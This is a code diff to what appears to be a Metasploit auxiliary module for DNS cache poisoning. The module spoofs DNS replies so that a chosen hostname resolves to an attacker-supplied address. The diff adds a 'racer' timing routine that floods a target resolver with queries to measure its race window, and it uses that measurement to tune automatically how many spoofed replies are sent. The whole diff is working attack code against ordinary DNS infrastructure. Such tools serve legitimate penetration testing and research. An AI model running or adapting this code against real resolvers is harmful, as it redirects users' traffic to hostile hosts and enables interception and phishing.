@@ -39,15 +39,30 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 					OptPort.new('SRCPORT', [true, "The target server's source query port (0 for automatic)", nil]),
 					OptString.new('HOSTNAME', [true, 'Hostname to hijack', 'pwned.example.com']),
 					OptAddress.new('NEWADDR', [true, 'New address for hostname', '1.3.3.7']),
-					OptAddress.new('RECONS', [true, 'Nameserver used for reconnaissance', '208.67.222.222']),
-					OptInt.new('XIDS', [true, 'Number of XIDs to try for each query', 10]),
-					OptInt.new('TTL', [true, 'TTL for the malicious host entry', 31337]),
+					OptAddress.new('RECONS', [true, 'The nameserver used for reconnaissance', '208.67.222.222']),
+					OptInt.new('XIDS', [true, 'The number of XIDs to try for each query (0 for automatic)', 0]),
+					OptInt.new('TTL', [true, 'The TTL for the malicious host entry', 31337]),
 				], self.class)
 					
 	end
 	
 	def auxiliary_commands
-		return { "check" => "Determine if the specified DNS server (RHOST) is vulnerable" }
+		return { 
+			"check" => "Determine if the specified DNS server (RHOST) is vulnerable",
+			"racer" => "Determine the size of the window for the target server"
+		 }
+	end
+	
+	def cmd_racer(*args)
+		targ = args[0] || rhost()
+		dom  = args[1] || "example.com"
+		
+		if(not (targ and targ.length > 0))
+			print_status("usage: racer [dns-server] [domain]")
+			return
+		end
+			
+		calculate_race(targ, dom)
 	end
 
 	def cmd_check(*args)
@@ -121,6 +136,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 		xids     = datastore['XIDS'].to_i
 		newttl   = datastore['TTL'].to_i
 		xidbase  = rand(20001) + 20000
+		numxids = xids
 
 		domain = hostname.sub(/\w+\x2e/,"")
 		
@@ -223,6 +239,20 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			return
 		end
 
+
+		if(xids == 0)
+			print_status("Calculating the number of spoofed replies to send per query...")
+			qcnt = calculate_race(target, domain, 100)
+			numxids = ((qcnt * 1.5) / barbs.length).to_i
+			if(numxids == 0)
+				print_status("The server did not reply, giving up.")
+				srv_sock.close
+				disconnect_ip
+				return
+			end			
+			print_status("Sending #{numxids} spoofed replies for each query")
+		end
+
 		# Flood the target with queries and spoofed responses, one will eventually hit
 		queries = 0
 		responses = 0
@@ -262,7 +292,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			req.qr = 1
 			req.ra = 1
 
-			xidbase.upto(xidbase+xids-1) do |id|
+			xidbase.upto(xidbase+numxids-1) do |id|
 				req.id = id
 				barbs.each do |barb|
 					buff = (
@@ -284,6 +314,18 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			# status update
 			if queries % 1000 == 0
 				print_status("Sent #{queries} queries and #{responses} spoofed responses...")
+				if(xids == 0)
+					print_status("Recalculating the number of spoofed replies to send per query...")
+					qcnt = calculate_race(target, domain, 25)
+					numxids = ((qcnt * 1.5) / barbs.length).to_i
+					if(numxids == 0)
+						print_status("The server has stopped replying, giving up.")
+						srv_sock.close
+						disconnect_ip
+						return
+					end
+					print_status("Now sending #{numxids} spoofed replies for each query")
+				end				
 			end
 
 			# every so often, check and see if the target is poisoned...
@@ -312,10 +354,106 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 					print_status("Error querying the DNS name: #{e.class} #{e} #{e.backtrace}")
 				end
 			end
-
 		end
-
 	end
+
+	#
+	# Send a recursive query to the target server, then flood
+	# the server with non-recursive queries for the same entry.
+	# Calculate how many non-recursive queries we receive back
+	# until the real server responds. This should give us a 
+	# ballpark figure for ns->ns latency. We can repeat this 
+	# a few times to account for each nameserver the cache server
+	# may query for the target domain.
+	#
+	def calculate_race(server, domain, num=50)
+
+		q_beg_t = nil
+		q_end_t = nil
+		cnt     = 0
+
+		times   = []
+		
+		hostname = Rex::Text.rand_text_alphanumeric(16) + domain
+				
+		sock = Rex::Socket.create_udp(
+			'PeerHost' => server,
+			'PeerPort' => 53
+		)
+
+
+		req = Resolv::DNS::Message.new
+		req.add_question(hostname, Resolv::DNS::Resource::IN::A)
+		req.rd = 1
+		req.id = 1
+
+		Thread.critical = true
+		q_beg_t = Time.now.to_f
+		sock.put(req.encode)
+		req.rd = 0
+					
+		while(times.length < num)
+			res, addr = sock.recvfrom(65535, 0.01)
+
+			if res and res.length > 0
+				res = Resolv::DNS::Message.decode(res)
+
+				if(res.id == 1)
+					times << [Time.now.to_f - q_beg_t, cnt]
+					cnt = 0
+					
+					hostname = Rex::Text.rand_text_alphanumeric(16) + domain
+
+					Thread.critical = false
+					
+					sock.close					
+					sock = Rex::Socket.create_udp(
+						'PeerHost' => server,
+						'PeerPort' => 53
+					)		
+					
+					Thread.critical = true
+					
+					q_beg_t = Time.now.to_f
+					req = Resolv::DNS::Message.new
+					req.add_question(hostname, Resolv::DNS::Resource::IN::A)
+					req.rd = 1
+					req.id = 1
+					
+					sock.put(req.encode)
+					req.rd = 0	
+				end
+				
+				cnt += 1
+			end
+			
+			req.id += 1
+			
+			sock.put(req.encode)		
+		end
+		
+		Thread.critical = false
+		
+		min_time = (times.map{|i| i[0]}.min * 100).to_i / 100.0
+		max_time = (times.map{|i| i[0]}.max * 100).to_i / 100.0
+		sum       = 0
+		times.each{|i| sum += i[0]}
+		avg_time = (	(sum / times.length) * 100).to_i / 100.0
+		
+		min_count = times.map{|i| i[1]}.min
+		max_count = times.map{|i| i[1]}.max
+		sum       = 0
+		times.each{|i| sum += i[1]}
+		avg_count = sum / times.length
+				
+		sock.close
+		
+		print_status("  race calc: #{times.length} queries | min/max/avg time: #{min_time}/#{max_time}/#{avg_time} | min/max/avg replies: #{min_count}/#{max_count}/#{avg_count}")
+
+
+		# XXX: We should subtract the timing from the target to us (calculated based on 0.50 of our non-recursive query times)
+		avg_count
+	end	
 
 end
 end	
